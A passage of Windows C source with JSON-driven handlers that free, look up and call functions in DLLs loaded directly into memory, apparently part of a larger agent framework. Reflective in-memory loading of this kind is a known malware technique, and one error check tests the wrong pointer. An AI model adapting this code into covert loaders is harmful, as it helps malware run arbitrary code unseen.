			lpJsonLoaderMemoryModuleResponseResults = cJSON_CreateBool(cJSON_True);
			if (NULL == lpJsonLoaderMemoryModuleResponseResults)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleResponseResults = cJSON_CreateBool(%d) failed.\n"),
					cJSON_True
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_FreeLibrary_Results, lpJsonLoaderMemoryModuleResponseResults);

			// Free allocated buffer
			cJSON_free(lpModulePointer);
			lpModulePointer = NULL;


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szLoaderMemoryModuleOutput = cJSON_Print(lpJsonLoaderMemoryModuleOutput);
			if (NULL == szLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonLoaderMemoryModuleOutput
				);
				__leave;
			}
			dwLoaderMemoryModuleOutputSize = (DWORD)strlen(szLoaderMemoryModuleOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonOutputSize: %d"), dwJsonOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonOutput:     %p"), szJsonOutput);
			//printf("szJsonOutput:\n%s\n", szJsonOutput);

			(*lppOutputBuffer) = (LPBYTE)szLoaderMemoryModuleOutput;
			(*lpdwOutputBufferSize) = dwLoaderMemoryModuleOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonLoaderMemoryModuleInput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleInput);
				lpJsonLoaderMemoryModuleInput = NULL;
			}

			if (NULL != lpJsonLoaderMemoryModuleOutput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleOutput);
				lpJsonLoaderMemoryModuleOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szLoaderMemoryModuleOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI LoaderMemoryModuleGetProcAddr(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szLoaderMemoryModuleInput = NULL;
	DWORD	dwLoaderMemoryModuleInputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleInput = NULL;
	cJSON*	lpJsonLoaderMemoryModuleGetProcAddrRequest = NULL;
	cJSON*	lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle = NULL;
	cJSON*	lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName = NULL;

	LPBYTE	lpModulePointer = NULL;
	int		nModulePointerSize = 0;
	HMEMORYMODULE hMemoryModule = NULL;
	CHAR*	szFunctionName = NULL;

	FARPROC		fpProcAddress = NULL;

	CHAR*	szLoaderMemoryModuleOutput = NULL;
	DWORD	dwLoaderMemoryModuleOutputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleOutput = NULL;
	//cJSON*	lpJsonLoaderMemoryModuleResponse = NULL;
	cJSON*	lpJsonLoaderMemoryModuleResponseFunctionPointer = NULL;


	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szLoaderMemoryModuleInput = (char*)lpInputBuffer;
			dwLoaderMemoryModuleInputSize = dwInputBufferSize;


			/********************************************************************************
				Parse input arguments
			********************************************************************************/
			lpJsonLoaderMemoryModuleInput = cJSON_Parse(szLoaderMemoryModuleInput);
			if (NULL == lpJsonLoaderMemoryModuleInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create a response JSON object
			lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject();
			if (NULL == lpJsonLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			//// Create the TSM_SURVEY_QUERY_RESPONSE JSON object
			//lpJsonLoaderMemoryModuleResponse = cJSON_AddObjectToObject(lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_GetProcAddr_Response);
			//if (NULL == lpJsonLoaderMemoryModuleResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonLoaderMemoryModuleResponse = cJSON_AddObjectToObject(%p, %S) failed.\n"),
			//		lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_GetProcAddr_Response
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonLoaderMemoryModuleResponse:    %p"), lpJsonLoaderMemoryModuleResponse);


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the LoaderMemoryModule_GetProcAddr_Response object
			lpJsonLoaderMemoryModuleGetProcAddrRequest = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleInput, LoaderMemoryModule_GetProcAddr_Request);
			if (NULL == lpJsonLoaderMemoryModuleGetProcAddrRequest)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleInput, LoaderMemoryModule_GetProcAddr_Request
				);
				__leave;
			}
			
			// Get the LoaderMemoryModule_GetProcAddr_ModuleHandle
			lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleGetProcAddrRequest, LoaderMemoryModule_GetProcAddr_ModuleHandle);
			if (NULL == lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleGetProcAddrRequest,	LoaderMemoryModule_GetProcAddr_ModuleHandle
				);
				__leave;
			}
			if (
				(!cJSON_IsBytes(lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle)) ||
				(NULL == lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsBytes(%p) failed."),
					lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle
				);
				__leave;
			}

			lpModulePointer = cJSON_GetBytesValue(lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle, (&nModulePointerSize));
			if (NULL == lpModulePointer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpModulePointer = cJSON_GetBytesValue(%p, %p) failed."),
					lpJsonLoaderMemoryModuleGetProcAddrRequestModuleHandle, (&nModulePointerSize)
				);
				__leave;
			}
			hMemoryModule = *(HMEMORYMODULE*)(lpModulePointer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:  %p"), LoaderMemoryModule_GetProcAddr_ModuleHandle, hMemoryModule);

			if (NULL == hMemoryModule)
			{
				dwErrorCode = ERROR_INVALID_HANDLE;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("hMemoryModule is invalid.\n")
				);
				__leave;
			}


			// Get the LoaderMemoryModule_GetProcAddr_FunctionName
			lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleGetProcAddrRequest, LoaderMemoryModule_GetProcAddr_FunctionName);
			if (NULL == lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleGetProcAddrRequest, LoaderMemoryModule_GetProcAddr_FunctionName
				);
				__leave;
			}
			if (
				(!cJSON_IsString(lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName)) ||
				(NULL == lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsString(%p) failed."),
					lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName
				);
				__leave;
			}

			szFunctionName = lpJsonLoaderMemoryModuleGetProcAddrRequestFunctionName->valuestring;
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:  %S"), LoaderMemoryModule_GetProcAddr_FunctionName, szFunctionName);

			fpProcAddress = MemoryGetProcAddress(
				hMemoryModule,
				szFunctionName
			);
			if (NULL == fpProcAddress)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("MemoryGetProcAddress( %p, %S ) failed.\n"),
					hMemoryModule,
					szFunctionName
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("fpProcAddress:        %p"), fpProcAddress);

			// Create the function pointer output
			lpJsonLoaderMemoryModuleResponseFunctionPointer = cJSON_CreateBytes((LPBYTE)(&fpProcAddress), sizeof(fpProcAddress));
			if (NULL == lpJsonLoaderMemoryModuleResponseFunctionPointer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleResponseFunctionPointer = cJSON_CreateBytes(%p, %d) failed.\n"),
					(LPBYTE)(&fpProcAddress), sizeof(fpProcAddress)
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_GetProcAddr_FunctionPointer, lpJsonLoaderMemoryModuleResponseFunctionPointer);

			// Free allocated buffer
			cJSON_free(lpModulePointer);
			lpModulePointer = NULL;


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szLoaderMemoryModuleOutput = cJSON_Print(lpJsonLoaderMemoryModuleOutput);
			if (NULL == szLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonLoaderMemoryModuleOutput
				);
				__leave;
			}
			dwLoaderMemoryModuleOutputSize = (DWORD)strlen(szLoaderMemoryModuleOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonOutputSize: %d"), dwJsonOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonOutput:     %p"), szJsonOutput);
			//printf("szJsonOutput:\n%s\n", szJsonOutput);

			(*lppOutputBuffer) = (LPBYTE)szLoaderMemoryModuleOutput;
			(*lpdwOutputBufferSize) = dwLoaderMemoryModuleOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonLoaderMemoryModuleInput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleInput);
				lpJsonLoaderMemoryModuleInput = NULL;
			}

			if (NULL != lpJsonLoaderMemoryModuleOutput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleOutput);
				lpJsonLoaderMemoryModuleOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szLoaderMemoryModuleOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI LoaderMemoryModuleCallProc(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szLoaderMemoryModuleInput = NULL;
	DWORD	dwLoaderMemoryModuleInputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleInput = NULL;
	cJSON*	lpJsonLoaderMemoryModuleCallProcRequest = NULL;
	cJSON*	lpJsonLoaderMemoryModuleCallProcRequestModuleHandle = NULL;
	cJSON*	lpJsonLoaderMemoryModuleCallProcRequestFunctionName = NULL;
	cJSON*	lpJsonLoaderMemoryModuleCallProcRequestBufferArgument = NULL;
	cJSON*	lpJsonLoaderMemoryModuleCallProcRequestSizeArgument = NULL;
	LPBYTE	lpBufferArgument = NULL;
	INT		nBufferArgumentSize = NULL;
	DWORD	dwSizeArgument = 0;

	LPBYTE	lpModulePointer = NULL;
	int		nModulePointerSize = 0;
	HMEMORYMODULE hMemoryModule = NULL;
	CHAR*	szFunctionName = NULL;

	DWORD		dwCallProcType = 0;

	FARPROC		fpProcAddress = NULL;

	CHAR*	szLoaderMemoryModuleOutput = NULL;
	DWORD	dwLoaderMemoryModuleOutputSize = 0;
	cJSON*	lpJsonLoaderMemoryModuleOutput = NULL;
	cJSON*	lpJsonLoaderMemoryModuleResponseFunctionReturn = NULL;
	DWORD	dwFunctionReturn = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szLoaderMemoryModuleInput = (char*)lpInputBuffer;
			dwLoaderMemoryModuleInputSize = dwInputBufferSize;


			/********************************************************************************
				Parse input arguments
			********************************************************************************/
			lpJsonLoaderMemoryModuleInput = cJSON_Parse(szLoaderMemoryModuleInput);
			if (NULL == lpJsonLoaderMemoryModuleInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create a response JSON object
			lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject();
			if (NULL == lpJsonLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}


			/********************************************************************************
				Parse input parameters
			********************************************************************************/
			// Get the LoaderMemoryModule_CallProc_Request object
			lpJsonLoaderMemoryModuleCallProcRequest = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleInput, LoaderMemoryModule_CallProc_Request);
			if (NULL == lpJsonLoaderMemoryModuleCallProcRequest)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleInput, LoaderMemoryModule_CallProc_Request
				);
				__leave;
			}

			// Get the LoaderMemoryModule_CallProc_ModuleHandle
			lpJsonLoaderMemoryModuleCallProcRequestModuleHandle = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_ModuleHandle);
			if (NULL == lpJsonLoaderMemoryModuleCallProcRequestModuleHandle)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleCallProcRequestModuleHandle = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_ModuleHandle
				);
				__leave;
			}
			lpModulePointer = cJSON_GetBytesValue(lpJsonLoaderMemoryModuleCallProcRequestModuleHandle, (&nModulePointerSize));
			if (NULL == lpModulePointer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpModulePointer = cJSON_GetBytesValue(%p, %p) failed."),
					lpJsonLoaderMemoryModuleCallProcRequestModuleHandle, (&nModulePointerSize)
				);
				__leave;
			}
			hMemoryModule = *(HMEMORYMODULE*)(lpModulePointer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:  %p"), LoaderMemoryModule_CallProc_ModuleHandle, hMemoryModule);

			// Get the LoaderMemoryModule_CallProc_FunctionName
			lpJsonLoaderMemoryModuleCallProcRequestFunctionName = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_FunctionName);
			if (NULL == lpJsonLoaderMemoryModuleCallProcRequestFunctionName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleCallProcRequestFunctionName = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_FunctionName
				);
				__leave;
			}
			szFunctionName = cJSON_GetStringValue(lpJsonLoaderMemoryModuleCallProcRequestFunctionName);
			if (NULL == szFunctionName)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpModulePointer = cJSON_GetStringValue(%p) failed."),
					lpJsonLoaderMemoryModuleCallProcRequestFunctionName
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:  %S"), LoaderMemoryModule_CallProc_FunctionName, szFunctionName);

			// Get the LoaderMemoryModule_CallProc_BufferArgument
			lpJsonLoaderMemoryModuleCallProcRequestBufferArgument = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_BufferArgument);
			if (NULL == lpJsonLoaderMemoryModuleCallProcRequestBufferArgument)
			{
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonLoaderMemoryModuleCallProcRequestBufferArgument = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_BufferArgument
				);
			}
			else
			{
				lpBufferArgument = cJSON_GetBytesValue(lpJsonLoaderMemoryModuleCallProcRequestBufferArgument, (&nBufferArgumentSize));
				if (NULL == lpModulePointer)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpBufferArgument = cJSON_GetBytesValue(%p, %p) failed."),
						lpJsonLoaderMemoryModuleCallProcRequestBufferArgument, (&nBufferArgumentSize)
					);
					__leave;
				}
				DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:  %p (%d)"), LoaderMemoryModule_CallProc_BufferArgument, lpBufferArgument, nBufferArgumentSize);
				dwCallProcType += 1;
			}

			// Get the LoaderMemoryModule_CallProc_SizeArgument
			lpJsonLoaderMemoryModuleCallProcRequestSizeArgument = cJSON_GetObjectItemCaseSensitive(lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_SizeArgument);
			if (NULL == lpJsonLoaderMemoryModuleCallProcRequestSizeArgument)
			{
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonLoaderMemoryModuleCallProcRequestSizeArgument = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonLoaderMemoryModuleCallProcRequest, LoaderMemoryModule_CallProc_SizeArgument
				);
			}
			else
			{
				if ( !cJSON_IsNumber( lpJsonLoaderMemoryModuleCallProcRequestSizeArgument ) )
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("cJSON_IsNumber( %p ) failed."),
						lpJsonLoaderMemoryModuleCallProcRequestSizeArgument
					);
					__leave;
				}
				dwSizeArgument = lpJsonLoaderMemoryModuleCallProcRequestSizeArgument->valueint;
				DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:  %d"), LoaderMemoryModule_CallProc_SizeArgument, dwSizeArgument);
				dwCallProcType += 2;
			}


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			if (NULL == hMemoryModule)
			{
				dwErrorCode = ERROR_INVALID_HANDLE;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("hMemoryModule is invalid.\n")
				);
				__leave;
			}


			fpProcAddress = MemoryGetProcAddress(
				hMemoryModule,
				szFunctionName
			);
			if (NULL == fpProcAddress)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("MemoryCallProcess( %p, %S ) failed.\n"),
					hMemoryModule,
					szFunctionName
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("fpProcAddress:        %p"), fpProcAddress);


			switch (dwCallProcType)
			{
				case 0:
				{
					dwFunctionReturn = ((CALLPROC_0)fpProcAddress)();
					break;
				}
				case 1:
				{
					dwFunctionReturn = ((CALLPROC_1)fpProcAddress)(lpBufferArgument);
					break;
				}
				case 2:
				{
					dwFunctionReturn = ((CALLPROC_2)fpProcAddress)(dwSizeArgument);
					break;
				}
				case 3:
				{
					dwFunctionReturn = ((CALLPROC_3)fpProcAddress)(lpBufferArgument,dwSizeArgument);
					break;
				}
				default:
				{
					dwErrorCode = ERROR_BAD_ARGUMENTS;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("Invalid call type.\n")
					);
					__leave;
				}
			}


			// Create the function return output
			lpJsonLoaderMemoryModuleResponseFunctionReturn = cJSON_CreateNumber(dwFunctionReturn);
			if (NULL == lpJsonLoaderMemoryModuleResponseFunctionReturn)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLoaderMemoryModuleResponseFunctionPointer = cJSON_CreateNumber(%d) failed.\n"),
					dwFunctionReturn
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonLoaderMemoryModuleOutput, LoaderMemoryModule_CallProc_FunctionReturn, lpJsonLoaderMemoryModuleResponseFunctionReturn);

			// Free allocated buffer
			cJSON_free(lpModulePointer);
			lpModulePointer = NULL;


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szLoaderMemoryModuleOutput = cJSON_Print(lpJsonLoaderMemoryModuleOutput);
			if (NULL == szLoaderMemoryModuleOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonLoaderMemoryModuleOutput
				);
				__leave;
			}
			dwLoaderMemoryModuleOutputSize = (DWORD)strlen(szLoaderMemoryModuleOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonOutputSize: %d"), dwJsonOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonOutput:     %p"), szJsonOutput);
			//printf("szJsonOutput:\n%s\n", szJsonOutput);

			(*lppOutputBuffer) = (LPBYTE)szLoaderMemoryModuleOutput;
			(*lpdwOutputBufferSize) = dwLoaderMemoryModuleOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonLoaderMemoryModuleInput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleInput);
				lpJsonLoaderMemoryModuleInput = NULL;
			}

			if (NULL != lpJsonLoaderMemoryModuleOutput)
			{
				cJSON_Delete(lpJsonLoaderMemoryModuleOutput);
				lpJsonLoaderMemoryModuleOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szLoaderMemoryModuleOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}